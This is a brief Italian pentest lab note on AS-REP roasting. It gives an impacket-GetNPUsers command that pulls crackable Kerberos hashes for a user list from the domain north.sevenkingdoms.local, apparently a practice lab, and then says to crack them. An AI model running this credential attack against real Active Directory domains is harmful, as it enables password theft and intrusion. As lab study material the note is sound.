### **ASPREP-roasting**
Hai trovato la lista degli username, ora spolvera gli appunti
```bash
impacket-GetNPUsers 'north.sevenkingdoms.local/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
```
![[Pasted image 20230810171242.png]]
cracca l'hash
